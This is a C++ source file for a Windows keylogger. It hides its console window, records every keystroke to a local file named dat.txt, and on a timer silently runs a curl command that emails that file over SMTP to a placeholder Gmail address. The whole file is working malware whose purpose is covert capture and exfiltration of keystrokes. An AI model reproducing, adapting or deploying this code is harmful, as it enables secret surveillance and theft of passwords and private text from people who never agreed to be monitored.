#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <sstream>
#include <cstdlib>
#include <cstdio>
#include <algorithm>
#include <vector>
#include <time.h>
using namespace std;
void LOG(string input)
{
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}
bool SpecialKeys(int S_Key)
{
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("[SHIFT]");
		return true;
	case VK_BACK:
		LOG("\b");
		return true;
	case VK_RBUTTON:
		LOG("[R_CLICK]");
		return true;
	case VK_CAPITAL:
		LOG("[CAPS_LCOK]");
		return true;
	case VK_TAB:
		LOG("[TAB]");
		return true;
	case VK_UP:
		LOG("[UP_ARROW_KEY]");
		return true;
	case VK_DOWN:
		LOG("[DOWN_ARROW_KEY]");
		return true;
	case VK_LEFT:
		LOG("[LEFT_ARROW_KEY]");
		return true;
	case VK_RIGHT:
		LOG("[RIGHT_ARROW_KEY]");
		return true;
	case VK_CONTROL:
		LOG("[CONTROL]");
		return true;
	case VK_MENU:
		LOG("[ALT]");
		return true;
	default:
		return false;
	}
}
int main(void)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	double elapsedTime = 0;
	clock_t stopTime;
	clock_t startTime = clock();
	char KEY = 'x';
	while (true) {
		if (elapsedTime < 300000)
		{
		stopTime = clock();
		elapsedTime = (stopTime - startTime);
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
		}
		else {
			char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"your_email@gmail.com\" --mail-rcpt \"email's receptor@gmail.com\" --ssl -u your_email@gmail.com:your_password -T \"dat.txt\" -k --anyauth";
    		WinExec(command, SW_HIDE);
			stopTime = 0;
			startTime = 0;
			elapsedTime = 0;
			startTime = clock();
			}
	}
	return 0;
}

